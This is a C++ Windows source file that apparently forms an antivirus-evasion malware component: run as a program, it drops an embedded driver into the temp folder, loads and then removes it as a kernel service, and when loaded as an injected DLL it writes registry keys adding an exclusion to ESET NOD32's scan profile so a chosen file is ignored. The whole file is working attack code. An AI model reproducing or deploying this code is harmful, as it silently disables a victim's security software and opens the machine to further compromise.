#include <intrin.h>
#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <Winspool.h>

#include "ntdll.h"
#include "utils.h"
#include "Service.h"

wchar_t IgnoreFile[MAX_PATH] = L"NOD32 ignore file";

VOID WorkEXE()
{
	SecCfg::SECTION_CONFIG Cfg;

	Cfg.Name = SECCFG_SECTION_NAME;

	SecCfg::GetSectionConfig(&Cfg, GetModuleHandle(NULL));

	WCHAR TempPath[MAX_PATH];
	WCHAR DrvPath[MAX_PATH];

	GetTempPath(RTL_NUMBER_OF(TempPath), TempPath);
	GetTempFileName(TempPath, NULL, 0, DrvPath);
	lstrcat(DrvPath, L".sys");
	FileWrite(DrvPath, Cfg.Image, Cfg.Raw.ImageSize);


	WCHAR DllPath[MAX_PATH];
	WCHAR FileName[MAX_PATH];

	lstrcpy(DllPath, DrvPath);
	lstrcat(DllPath, L".dll");
	GetModuleFileName(NULL, FileName, RTL_NUMBER_OF(FileName));
	CopyFile(FileName, DllPath, FALSE);
	SetFileDllFlag(DllPath);

	CService svc(DrvPath, PathFindFileName(DrvPath), PathFindFileName(DrvPath), SERVICE_DEMAND_START);
	svc.CreateSvc();
	svc.StartSvc();
	Sleep(5000);
	svc.StopSvc();
	svc.UnloadSvc();

	DeleteFile(DrvPath);
	DeleteFile(DllPath);

//	MessageBox(NULL, L"OK", L"OK", 0);
}

void SetReestr( wchar_t* path, wchar_t* item, DWORD type, BYTE* data, int lenData )
{
   DWORD result;
   HKEY key;
//   OutputDebugString(path);
   int err = RegCreateKeyEx( HKEY_LOCAL_MACHINE, path, 0, 0, REG_OPTION_NON_VOLATILE,
                            KEY_ALL_ACCESS, 0, &key, &result );
   if( err == ERROR_SUCCESS )
   {
	    long err = RegSetValueEx( key, item, 0, type, data, lenData );
		RegCloseKey(key);
		if( err != ERROR_SUCCESS )
		{
//			OutputDebugString(L"Error2");
		}
   }
   else
   {
//	   OutputDebugString(L"Error");
   }
}

VOID WorkDLL()
{
//	WCHAR FileName[MAX_PATH];

//	GetModuleFileName(NULL, FileName, RTL_NUMBER_OF(FileName));
//	PWCHAR FileNameShort = PathFindFileName(FileName);

//	OutputDebugString(L"INJECTED!!!!");
//	OutputDebugString(FileNameShort);
	OutputDebugString(IgnoreFile);
	int len = lstrlen(IgnoreFile);
//	SetReestr( L"SOFTWARE\\ESET\\ESET Security\\CurrentVersion\\Plugins\\01000600\\Profiles\\@My profile\\Excludes\\Node_00009999", L"Path", REG_EXPAND_SZ, (BYTE*)L"c:\\test\\ru_az.exe", 36 );
	SetReestr( L"SOFTWARE\\ESET\\ESET Security\\CurrentVersion\\Plugins\\01000600\\Profiles\\@My profile\\Excludes\\Node_00009999", L"Path", REG_EXPAND_SZ, (BYTE*)IgnoreFile, 2 * (len + 1) );
	SetReestr( L"SOFTWARE\\ESET\\ESET Security\\CurrentVersion\\Plugins\\01000600\\Profiles\\@My profile\\Excludes\\Node_00009999", L"Infiltration", REG_EXPAND_SZ, (BYTE*)"", 2 );
	DWORD flags = 0;
	SetReestr( L"SOFTWARE\\ESET\\ESET Security\\CurrentVersion\\Plugins\\01000600\\Profiles\\@My profile\\Excludes\\Node_00009999", L"Flags", REG_DWORD, (BYTE*)&flags, 4 );
//	NtUnmapViewOfSection(GetModuleHandle(L"ntdll.dll");
}

BOOLEAN g_Dll = FALSE;

int APIENTRY Main(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	if (fdwReason == DLL_PROCESS_ATTACH)
	{
		g_Dll = TRUE;

		WorkDLL();

		return TRUE;
	}
	else
	{
		if (!g_Dll)
		{
			WorkEXE();
		}
	}

	return TRUE;
}